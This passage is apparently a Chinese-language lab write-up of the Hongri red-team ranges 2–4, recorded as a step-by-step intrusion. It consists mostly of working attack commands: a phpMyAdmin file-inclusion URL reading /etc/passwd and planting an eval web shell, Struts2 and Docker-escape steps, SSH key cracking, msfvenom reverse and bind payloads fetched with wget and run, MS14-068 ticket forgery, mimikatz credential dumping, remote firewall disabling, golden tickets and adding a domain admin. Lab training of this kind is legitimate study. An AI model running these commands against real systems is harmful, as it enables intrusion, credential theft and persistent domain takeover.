<h4 id="法二-3"><a href="#法二-3" class="headerlink" title="法二"></a>法二</h4><p>文件上传cs的exe码，然后命令执行去执行</p>
<p>理论可行，未实践</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>右键elevate提权，用的svc-exe</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">net user /domain    </span><br><span class="line">#查询域内用户</span><br><span class="line">shell ipconfig /all</span><br><span class="line"># 查看本机ip，所在域</span><br><span class="line">shell net group &quot;domain admins&quot; /domain   </span><br><span class="line">#查看域管理员用户</span><br><span class="line">net group &quot;domain controllers&quot; /domain     </span><br><span class="line">#查看域控：</span><br><span class="line">net group &quot;domain computers&quot; /domain  </span><br><span class="line"># 查看域中的其他主机名</span><br></pre></td></tr></table></figure>

<p>ping 其他主机获取IP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell ping DC</span><br><span class="line">shell ping PC</span><br></pre></td></tr></table></figure>

<p>使用arp探测一下内网机器及端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell arp -a</span><br></pre></td></tr></table></figure>

<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><h4 id="法一-4"><a href="#法一-4" class="headerlink" title="法一"></a>法一</h4><p><strong>用到cs的smb beacon进行流量中转</strong></p>
<h4 id="内网主机探活-端口扫描"><a href="#内网主机探活-端口扫描" class="headerlink" title="内网主机探活+端口扫描"></a>内网主机探活+端口扫描</h4><p>portscan 网段 端口 协议（icmp arp none）线程<br>portscan 10.10.10.0&#x2F;24 445 arp 50</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell portscan 10.10.10.0/24 1-1024,3389,5000-6000 arp 1024</span><br></pre></td></tr></table></figure>

<h4 id="445端口。可以尝试psexec横向移动登录DC"><a href="#445端口。可以尝试psexec横向移动登录DC" class="headerlink" title="445端口。可以尝试psexec横向移动登录DC"></a>445端口。可以尝试psexec横向移动登录DC</h4><p>mimikatz运行一下，在登录域控</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241225152558033.png?raw=true" alt="image-20241225152558033"></p>
<p>psexec64，用web的管理员账户会话，监听器新建smb</p>
<p><code>PsExec_64</code> 是 <strong>PsExec</strong> 工具的 64 位版本。它是由 <strong>Sysinternals</strong> 提供的一个命令行工具，允许用户在远程计算机上执行命令，而无需通过 RDP （Remote Desktop Protocol，远程桌面协议）或物理访问。</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241225152816513.png?raw=true" alt="image-20241225152816513"></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241225152439959.png?raw=true" alt="image-20241225152439959"></p>
<h4 id="用DC进入其他域用户"><a href="#用DC进入其他域用户" class="headerlink" title="用DC进入其他域用户"></a>用DC进入其他域用户</h4><p>jump-&gt;psexec_psh</p>
<p><code>psexec_psh</code> 是一个 <strong>PowerShell</strong> 利用模块，它通常被用于在目标系统上通过 <strong>PowerShell</strong> 执行命令。</p>
<p><strong>PSH</strong> 是 <strong>PowerShell</strong> 的缩写</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241225153052646.png?raw=true" alt="image-20241225153052646"></p>
<h4 id="法二-未成功"><a href="#法二-未成功" class="headerlink" title="法二-未成功"></a>法二-未成功</h4><p>通过web机子用ipc登录</p>
<p>用sc关闭DC防火墙</p>
<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="生成黄金票据"><a href="#生成黄金票据" class="headerlink" title="生成黄金票据"></a>生成黄金票据</h3><p>以后就可以通过边缘主机去访问这台域控</p>
<ol>
<li>首先<code>hashdump</code>出krbtgt的hash值</li>
<li>sid  &#x2F;&#x2F;run mimikatz或者</li>
<li>web主机上生成票据</li>
</ol>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241225164501601.png?raw=true" alt="image-20241225164501601"></p>
<h3 id="添加域管账户"><a href="#添加域管账户" class="headerlink" title="添加域管账户"></a>添加域管账户</h3><ul>
<li>shell net user &#x2F;domain</li>
<li>shell net group “domian Admins” bbb &#x2F;add &#x2F;domain</li>
<li>net group “Domain admins”  查看域管用户</li>
</ul>
<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p>一</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_51295677/article/details/124999758</span><br></pre></td></tr></table></figure>

<p>二</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_45780190/article/details/123156086</span><br></pre></td></tr></table></figure>

<p>三</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/9855?time__1311=n4%2BxnD0DuDRD9BDyAQD%2FiaReWqhDoiYD02oTD#toc-9</span><br></pre></td></tr></table></figure>

<p>四</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://drunkmars.top/2021/07/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://paoka1.top/2023/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C%E7%AC%94%E8%AE%B0/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/bktown/p/16904232.html#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8</span><br></pre></td></tr></table></figure>

<p>msf–c语言免杀</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://paoka1.top/2023/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C%E7%AC%94%E8%AE%B0/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://paoka1.top/2023/06/18/MSF-%E4%B8%8A%E7%BA%BF%E6%8E%A2%E7%A9%B6%E4%B8%8E%E5%85%8D%E6%9D%80/</span><br></pre></td></tr></table></figure>

<h1 id="红日靶场3"><a href="#红日靶场3" class="headerlink" title="+红日靶场3"></a>+红日靶场3</h1><p>靶机下载出来是挂起状态</p>
<p>nmap扫一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP -T4 192.168.57.0/24</span><br><span class="line">#出内网用户</span><br><span class="line">Nmap -T4 -sC -sV 192.168.1.110</span><br></pre></td></tr></table></figure>

















<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/zhouA0221/article/details/143165690</span><br></pre></td></tr></table></figure>

<h1 id="红日靶场4"><a href="#红日靶场4" class="headerlink" title="+红日靶场4"></a>+红日靶场4</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>网卡二改为192.168.183.0</p>
<p>DC.OVF文件导入虚拟机，就是新的</p>
<h3 id="账号密码"><a href="#账号密码" class="headerlink" title="账号密码"></a>账号密码</h3><p>内网网段要为192.168.183.0，不然win7的没权限账号，需要</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WEB主机 ubuntu:ubuntu</span><br><span class="line">WIN7主机 douser:Dotest123</span><br><span class="line">(DC)WIN2008主机 administrator:Test2008</span><br><span class="line">进去需要改密码，我改为Lidd8000ad</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先打开win7和DC靶机，web先不要打开；打开win7 ，密码Dotest123，点击控制面板，搜索电源，更改节能设置，全改为从不</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241227135208533.png?raw=true" alt="image-20241227135208533"></p>
<p>显示检测不到，不过没关系,能ping</p>
<h3 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h3><ul>
<li>win7<ul>
<li>192.168.183.2</li>
</ul>
</li>
<li>DC<ul>
<li>192.168.183.130</li>
</ul>
</li>
<li>web机子<ul>
<li>192.168.183.3</li>
<li>192.168.57.5</li>
</ul>
</li>
</ul>
<p>都可以ping通就行</p>
<h3 id="开启Ubuntu的docker服务"><a href="#开启Ubuntu的docker服务" class="headerlink" title="开启Ubuntu的docker服务"></a>开启Ubuntu的docker服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">进入root，使用docker开启docker ps -a中的第一，二，三和最后一个。</span><br><span class="line">ubuntu@ubuntu:~$ sudo -s</span><br><span class="line">[sudo] password for ubuntu: </span><br><span class="line">root@ubuntu:~# docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE                     COMMAND                  CREATED             STATUS                        PORTS                    NAMES</span><br><span class="line">ec814f6ee002        vulhub/phpmyadmin:4.8.1   &quot;docker-php-entrypoi…&quot;   4 years ago         Exited (255) 11 minutes ago   0.0.0.0:2003-&gt;80/tcp     cve-2018-12613_web_1</span><br><span class="line">174745108fcb        vulhub/struts2:2.3.30     &quot;/usr/local/bin/mvn-…&quot;   4 years ago         Exited (255) 11 minutes ago   0.0.0.0:2001-&gt;8080/tcp   s2-045_struts2_1</span><br><span class="line">09dd4e5bfa91        cve-2017-12615_tomcat     &quot;catalina.sh run&quot;        4 years ago         Exited (255) 11 minutes ago   0.0.0.0:2002-&gt;8080/tcp   cve-2017-12615_tomcat_1</span><br><span class="line">bbbcc627166b        910e51b43315              &quot;docker-php-entrypoi…&quot;   4 years ago         Exited (0) 4 years ago                                 compassionate_euler</span><br><span class="line">da81127935d7        910e51b43315              &quot;docker-php-entrypoi…&quot;   4 years ago         Exited (0) 4 years ago                                 blissful_benz</span><br><span class="line">3dbc242a8b6c        910e51b43315              &quot;docker-php-entrypoi…&quot;   4 years ago         Exited (0) 4 years ago                                 elegant_perlman</span><br><span class="line">abe05b39a6d6        910e51b43315              &quot;docker-php-entrypoi…&quot;   4 years ago         Exited (0) 4 years ago                                 wonderful_fermat</span><br><span class="line">ad7866b3df9b        mysql:5.5                 &quot;docker-entrypoint.s…&quot;   4 years ago         Exited (0) 4 years ago                                 cve-2018-12613_mysql_1</span><br><span class="line">root@ubuntu:~# docker start ec814f6ee002</span><br><span class="line">ec814f6ee002</span><br><span class="line">root@ubuntu:~# docker start 174745108fcb</span><br><span class="line">174745108fcb</span><br><span class="line">root@ubuntu:~# docker start 09dd4e5bfa91</span><br><span class="line">09dd4e5bfa91</span><br><span class="line">root@ubuntu:~# docker start ad7866b3df9b</span><br><span class="line">ad7866b3df9b</span><br></pre></td></tr></table></figure>

<h2 id="开打-前端"><a href="#开打-前端" class="headerlink" title="+开打&#x2F;前端"></a>+开打&#x2F;前端</h2><h3 id="主机探测-端口探测"><a href="#主机探测-端口探测" class="headerlink" title="主机探测+端口探测"></a>主机探测+端口探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l </span><br><span class="line">nmap -Pn 192.168.57.？</span><br></pre></td></tr></table></figure>

<p>确认IP192.168.57.5</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241227142406916.png?raw=true" alt="image-20241227142406916"></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241227143657307.png?raw=true" alt="image-20241227143657307"></p>
<h3 id="挨个端口看看"><a href="#挨个端口看看" class="headerlink" title="挨个端口看看"></a>挨个端口看看</h3><h4 id="2001是文件上传"><a href="#2001是文件上传" class="headerlink" title="2001是文件上传"></a>2001是文件上传</h4><p>查看网页源代码和工具，是java的struts</p>
<p>Struts2 Showcase - Fileupload sample</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241227142846343.png?raw=true" alt="image-20241227142846343"></p>
<p>先扫扫struct2</p>
<p>下载后需要编译：go build</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/xfiftyone/STS2G</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">探测</span><br><span class="line"> ./ST2G --url=http://192.168.157.128:2001 --mode scan</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">打</span><br><span class="line">./ST2G --url=http://192.168.57.5:2001 --mode exec --vn 45 --cmd id</span><br><span class="line"></span><br><span class="line">--vn:爆出的漏洞编码</span><br><span class="line">--cmd：shell命令</span><br></pre></td></tr></table></figure>

<h4 id="2002是tomcat"><a href="#2002是tomcat" class="headerlink" title="2002是tomcat"></a>2002是tomcat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/allintao/article/details/129503762</span><br></pre></td></tr></table></figure>

<p>进去版本号直接给了，找cve</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241227150626740.png?raw=true" alt="image-20241227150626740"></p>
<h4 id="2003是直接进数据库了，甚至没有弱口令"><a href="#2003是直接进数据库了，甚至没有弱口令" class="headerlink" title="2003是直接进数据库了，甚至没有弱口令"></a>2003是直接进数据库了，甚至没有弱口令</h4><p>版本信息： 4.8.1</p>
<p>有任意文件包含漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.57.5:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241227151122397.png?raw=true" alt="image-20241227151122397"></p>
<p><strong>包含session文件，获得getshell</strong></p>
<p>select “<?php phpinfo();?>“</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241227151910231.png?raw=true" alt="image-20241227151910231"></p>
<p>先退出账号，刷新sesison值，然后登录写码</p>
<h5 id="写码"><a href="#写码" class="headerlink" title="写码"></a>写码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php file_put_contents(&quot;shell.php&quot;,&quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot;);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.57.5:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_bed4439747e259290e4e88615bba0ef9</span><br></pre></td></tr></table></figure>

<p>shell.php空白页有码</p>
<h5 id="慢日志也该也行，没试"><a href="#慢日志也该也行，没试" class="headerlink" title="慢日志也该也行，没试"></a>慢日志也该也行，没试</h5><h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="++docker逃逸"></a>++docker逃逸</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">接下来使用2002端口，进行渗透</span><br><span class="line"></span><br><span class="line">回到根目录/，ls -al发现.dockernv文件，这个文件只有在docker中才会出现，所以推断这是docker容器</span><br><span class="line">fdisk -l:查看当前可挂载的磁盘-------------&gt;发现/dev/sda1，这个是默认的原系统磁盘</span><br><span class="line">mount /dev/sda1 /tet             -------------&gt;将/dev/sda1挂载到/tet（新建的）中，然后就得到了源系统根目录下的所有文件</span><br></pre></td></tr></table></figure>

<h3 id="ssh密钥爆破"><a href="#ssh密钥爆破" class="headerlink" title="ssh密钥爆破"></a>ssh密钥爆破</h3><ol>
<li>在home&#x2F;ubuntu&#x2F;.ssh中有一个ssh连接的密钥，复制下来，看看能不能爆破</li>
<li>换kali        vim ssh  粘贴里面</li>
<li>ssh2john ssh &gt;hash                          将密钥转化为可以爆破的对象</li>
<li>john hash –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt   爆破</li>
<li>ssh -i ssh <a href="mailto:&#117;&#98;&#117;&#x6e;&#116;&#117;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#53;&#55;&#x2e;&#53;">&#117;&#98;&#117;&#x6e;&#116;&#117;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#53;&#55;&#x2e;&#53;</a>        远程连接</li>
</ol>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241227154008159.png?raw=true" alt="image-20241227154008159"></p>
<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="+++域渗透"></a>+++域渗透</h2><h3 id="先提权Ubuntu"><a href="#先提权Ubuntu" class="headerlink" title="先提权Ubuntu"></a>先提权Ubuntu</h3><h3 id="1-frp隧道"><a href="#1-frp隧道" class="headerlink" title="1+frp隧道"></a>1+frp隧道</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frpc.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.57.131</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks4</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>

<p>tail &#x2F;etc&#x2F;proxychains4.conf</p>
<p><strong>客户端</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.ini &amp;</span><br></pre></td></tr></table></figure>

<p><strong>服务器</strong>-kali</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>



<h3 id="msf-1"><a href="#msf-1" class="headerlink" title="+msf"></a>+msf</h3><p><strong>msf里面</strong></p>
<p>做码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.57.131 LPORT=2095 -f elf &gt; 2095.elf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8080</span><br></pre></td></tr></table></figure>

<p>监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 2095</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><strong>客户端Ubuntu</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://VPSip:8080/2095.elf</span><br><span class="line"></span><br><span class="line">chmod 777 2095.elf</span><br><span class="line">nohup ./2095.elf &amp;</span><br></pre></td></tr></table></figure>

<p>弹出meterpreter</p>
<h4 id="打域"><a href="#打域" class="headerlink" title="打域"></a>打域</h4><p>ifconfig看其他网卡</p>
<p>扫内网用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.183.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241227185723729.png?raw=true" alt="image-20241227185723729"></p>
<h4 id="创建socks隧道"><a href="#创建socks隧道" class="headerlink" title="创建socks隧道"></a>创建socks隧道</h4><p>用的chisel或者msf都行</p>
<p>永恒之蓝打win7</p>
<p>去桌面用工具</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd \Users\douser\Desktop</span><br></pre></td></tr></table></figure>

<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug提取权限</span><br><span class="line">sekurlsa::logonpasswords命令进行抓取明文密码+SID</span><br></pre></td></tr></table></figure>

<h4 id="域提权MS14-068"><a href="#域提权MS14-068" class="headerlink" title="域提权MS14-068"></a>域提权MS14-068</h4><p>利用Kerberos 域用户提权漏洞（MS14-068;CVE-2014-6324)来获得域控。</p>
<p>如果攻击者获取了域内任何一台计算机的Shell权限，同时知道任意域用户的用户名、SID、密码，即可获得域管理员权限，进而控制域控制器，最终获得域权限。</p>
<p>　使用PyKEK可以生成一张高权限的服务票据，并通过mimikatz将服务票据注人内存。</p>
<p>　　使用PyKEK，可以将Python文件转换为可执行文件（在没有配置Python环境的操作系统中也可以执行此操作，在这台靶机中靶场搭建者已经给大家准备好了可执行文件版的MS14-068.exe)</p>
<p><strong>利用ms14-068伪造票据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123</span><br><span class="line"></span><br><span class="line">// ms14-068.exe -u 域成员名@域名.com -s 域成员sid -d 域控制器ip地址 -p 域成员密码</span><br></pre></td></tr></table></figure>

<p><strong>2、查看注入前的权限</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将票据文件复制到Windows Sever 2008机器的mimikatz目录下，使用mimikatz将票据注入内存。输入命令“net use \WIN-ENS2VR5TR3N\c$​”，提示“Access is denied&quot;，表示在将票据注入前无法列出域控制器C盘目录的内容。</span><br></pre></td></tr></table></figure>

<p><strong>3、清除内存中的所有票据</strong></p>
<p>mimikatz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>4、将高权限的票据注入内存</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc TGT_douser@DEMO.COM.ccache</span><br></pre></td></tr></table></figure>

<p><strong>5、查看域控</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\WIN-ENS2VR5TR3N</span><br><span class="line">dir \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></table></figure>

<h4 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h4><h5 id="法一关墙"><a href="#法一关墙" class="headerlink" title="法一关墙"></a>法一关墙</h5><p>首先关闭<strong>WIN7</strong>防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NetSh Advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<p>新建服务来关闭<strong>域控</strong>的防火墙：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line"></span><br><span class="line">sc \\WIN-ENS2VR5TR3N start unablefirewall</span><br></pre></td></tr></table></figure>

<p>msf生成码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=192.168.183.130 LPORT=7777 -f exe &gt; bind.exe</span><br></pre></td></tr></table></figure>

<p>创建服务运行木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create bindshell binpath= &quot;c:\bind.exe&quot;</span><br><span class="line">sc \\WIN-ENS2VR5TR3N start bindshell</span><br></pre></td></tr></table></figure>

<p>msf监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set Proxies socks5:127.0.0.1:1080</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.183.130</span><br><span class="line">set lport 7777</span><br><span class="line">set AutoRunScript post/windows/manage/migrate</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h5 id="法二关墙"><a href="#法二关墙" class="headerlink" title="法二关墙"></a>法二关墙</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo netsh advfirewall set allprofiles state off &gt; zxx.bat</span><br><span class="line"></span><br><span class="line">copy zxx.bat \\WIN-ENS2VR5TR3N\c$</span><br><span class="line"></span><br><span class="line">schtasks /create /S WIN-ENS2VR5TR3N /TN &quot;aaa&quot; /TR C:\xyc.bat /SC MINUTE /MO 1 /ru system /f /RP</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /S WIN-ENS2VR5TR3N /TN &quot;aaa&quot; /TR C:\bind.exe /SC MINUTE /MO 1 /ru system /f /RP</span><br></pre></td></tr></table></figure>

<h4 id="拿域控shell"><a href="#拿域控shell" class="headerlink" title="拿域控shell"></a>拿域控shell</h4><h5 id="打法1"><a href="#打法1" class="headerlink" title="打法1"></a><strong>打法1</strong></h5><p><img src="https://github.com/DDL08/images/blob/img/img/image-20241228134819724.png?raw=true" alt="image-20241228134819724"></p>
<p>应该是能传过来，只是在我这有信号传过来但没shell</p>
<h5 id="打法2"><a href="#打法2" class="headerlink" title="打法2"></a>打法2</h5><p><img src="https://github.com/DDL08/images/blob/img/img/image-20241228143905205.png?raw=true" alt="image-20241228143905205"></p>
<h3 id="2-chisel隧道"><a href="#2-chisel隧道" class="headerlink" title="2+chisel隧道"></a>2+chisel隧道</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 6666 --reverse</span><br><span class="line"> ./chisel client 192.168.57.8:6666 R:socks</span><br></pre></td></tr></table></figure>

<p>先将木马上传到win7中</p>
<p>再进入win7中，将木马传给域控：</p>
